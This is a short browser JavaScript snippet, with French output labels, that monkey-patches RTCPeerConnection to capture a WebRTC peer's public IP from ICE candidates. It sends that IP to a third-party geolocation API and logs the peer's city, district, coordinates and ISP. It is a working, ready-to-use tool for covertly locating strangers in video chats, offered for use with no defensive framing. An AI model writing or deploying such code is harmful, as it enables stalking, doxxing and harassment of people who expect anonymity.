const apiKey = "Votre clé ici.";

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    const ip = fields[4];

    if (fields[7] === "srflx") getLocation(ip);

    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };

  return pc;
};

const getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
  await fetch(url).then((response) =>
    response.json().then((json) => {

      const output = `
          ---------------------
          IP : ${json.ip}
          Pays : ${json.country_name}
          État : ${json.state_prov}
          Ville : ${json.city}
          Arrondissement : ${json.district}
          Latitude : ${json.latitude}
          Longitude : ${json.longitude}
          Opérateur : ${json.isp}
          ---------------------
          `;
      console.log(output);
    })
  );
};
